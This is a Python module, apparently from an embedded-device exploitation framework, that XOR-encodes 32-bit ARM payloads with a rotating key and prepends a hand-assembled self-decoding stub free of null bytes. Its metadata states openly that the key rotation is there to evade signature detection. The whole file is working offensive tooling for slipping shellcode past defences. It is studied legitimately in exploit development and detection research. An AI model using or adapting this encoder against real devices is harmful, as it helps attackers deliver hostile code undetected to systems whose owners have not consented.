"""ARM Little-Endian XOR Encoder with Key Rotation.

Encodes ARM (32-bit LE) payloads with rotating XOR keys and generates
a self-decoding stub. Avoids null bytes in output.

Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""

import os
import struct

from embedxpl.core.exploit.encoders import BaseEncoder
from embedxpl.core.exploit.payloads import Architectures
from embedxpl.core.exploit.printer import print_error, print_info

# ARM (32-bit) decoder stub: XOR-decodes payload in-place then falls through.
# r0=payload_ptr, r1=len, r2=key_ptr, r3=keylen, r5=key_idx
_STUB = (
    b"\x00\x00\x8f\xe2"  # adr r0, payload (patched)
    b"\x00\x10\xa0\xe3"  # mov r1, #LEN (patched)
    b"\x00\x20\x8f\xe2"  # adr r2, key (patched)
    b"\x00\x30\xa0\xe3"  # mov r3, #KEYLEN (patched)
    b"\x00\x50\xa0\xe3"  # mov r5, #0
    b"\x00\x40\xd0\xe5"  # ldrb r4, [r0]
    b"\x05\x60\xd2\xe7"  # ldrb r6, [r2, r5]
    b"\x06\x40\x24\xe0"  # eor r4, r4, r6
    b"\x01\x40\xc0\xe4"  # strb r4, [r0], #1
    b"\x01\x50\x85\xe2"  # add r5, r5, #1
    b"\x03\x00\x55\xe1"  # cmp r5, r3
    b"\x00\x50\xa0\x03"  # moveq r5, #0
    b"\x01\x10\x51\xe2"  # subs r1, r1, #1
    b"\xf7\xff\xff\x1a"  # bne loop
)


class Encoder(BaseEncoder):
    __info__ = {
        "name": "ARM Little-Endian XOR Encoder (Rotating Key)",
        "description": (
            "Encodes ARM (32-bit LE) payloads with rotating XOR keys "
            "and a self-decoding stub. Key rotation evades simple "
            "signature detection."
        ),
        "authors": ("Andre Henrique (@mrhenrike)", "Uniao Geek"),
        "evasion_score": 6,
    }

    architecture = Architectures.ARMLE
    key: bytes = b"\x41\x42\x43\x44"
    bad_bytes: bytes = b"\x00"
    max_key_len: int = 16

    def _gen_key(self, payload: bytes) -> bytes:
        key = self.key[:self.max_key_len] if self.key else os.urandom(4)
        for _ in range(256):
            ok = True
            for i, b in enumerate(payload):
                if bytes([b ^ key[i % len(key)]]) in self.bad_bytes:
                    ok = False; break
            if ok:
                return key
            key = bytes((b + 1) & 0xFF for b in key)
        print_info("Warning: could not fully avoid bad bytes")
        return self.key[:self.max_key_len] if self.key else os.urandom(4)

    def _patch_stub(self, key: bytes, plen: int) -> bytes:
        stub = bytearray(_STUB)
        kpad = len(key) + (4 - len(key) % 4) % 4
        total = len(stub) + kpad
        # adr r0, payload: add r0, pc, #offset (PC = instr + 8)
        stub[0:4] = struct.pack("<I", 0xE28F0000 | ((total - 8) & 0xFF))
        # mov r1, #payload_len
        if plen < 256:
            stub[4:8] = struct.pack("<I", 0xE3A01000 | plen)
        else:
            stub[4:8] = struct.pack("<I", 0xE3001000 | ((plen >> 12) & 0xF) << 16 | (plen & 0xFFF))
        # adr r2, key_data
        stub[8:12] = struct.pack("<I", 0xE28F2000 | ((len(stub) - 8 - 8) & 0xFF))
        # mov r3, #keylen
        stub[12:16] = struct.pack("<I", 0xE3A03000 | len(key))
        return bytes(stub) + key + b"\x00" * (kpad - len(key))

    def encode(self, payload: bytes) -> bytes:  # type: ignore[override]
        if not payload:
            print_error("Empty payload"); return b""
        key = self._gen_key(payload)
        encoded = bytes(payload[i] ^ key[i % len(key)] for i in range(len(payload)))
        stub = self._patch_stub(key, len(payload))
        result = stub + encoded
        print_info("Encoded {} bytes, {}-byte key ({})".format(len(payload), len(key), key.hex()))
        print_info("Output: {} bytes (stub: {}, payload: {})".format(
            len(result), len(stub), len(encoded)))
        nc = result.count(0)
        if nc:
            print_info("Warning: {} null bytes in output".format(nc))
        return result

    def decode(self, encoded: bytes) -> bytes:
        key = self.key[:self.max_key_len]
        kpad = len(key) + (4 - len(key) % 4) % 4
        skip = len(_STUB) + kpad
        if len(encoded) <= skip:
            return encoded
        data = encoded[skip:]
        return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

    def decode_stub_c(self) -> str:
        kh = ", ".join("0x{:02x}".format(b) for b in self.key)
        return (
            "// ARM LE XOR rotating-key decoder\n"
            "void decode(unsigned char *buf, int len) {{\n"
            "    unsigned char key[] = {{{k}}};\n"
            "    for (int i = 0; i < len; i++) buf[i] ^= key[i % {n}];\n"
            "}}\n"
        ).format(k=kh, n=len(self.key))
